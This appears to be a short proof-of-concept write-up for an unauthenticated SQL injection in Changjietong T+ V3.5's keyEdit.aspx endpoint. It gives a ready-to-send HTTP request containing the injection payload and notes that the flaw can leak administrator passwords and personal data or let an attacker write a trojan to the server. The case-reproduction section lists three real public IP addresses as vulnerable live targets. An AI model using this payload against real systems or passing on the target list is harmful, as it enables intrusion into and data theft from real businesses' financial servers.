# introduce

​		Changjietong's T+system is a financial settlement service system specifically designed for enterprise customers, which can help customers achieve the receipt, payment, settlement, and management of funds. This system supports functions such as cross-border payments, fund transfers, and financial statement generation, providing enterprises with a comprehensive financial management solution.

# Vulnerability description

​	Due to the lack of filtering and verification of user input at the keyEdit.aspx interface of Changjietong T+, unauthenticated attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, user personal information of the site), but even write Trojans to the server in high permission situations to further gain server system privileges.

# Principle of Vulnerability

```
GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Length: 104

```

# Case reproduction

### Case one:

http://221.0.184.76:8000/tplus/view/login.html

![image-20240516200305518](./pic/case1.png)

### Case two:

http://140.246.69.12:8001/tplus/view/login.html

![image-20240516195925635](./pic/case2.png)

### Case Three:

http://120.25.197.234/tplus/view/login.html

![image-20240516200042770](./pic/case3.png)



# The affected version

V3.5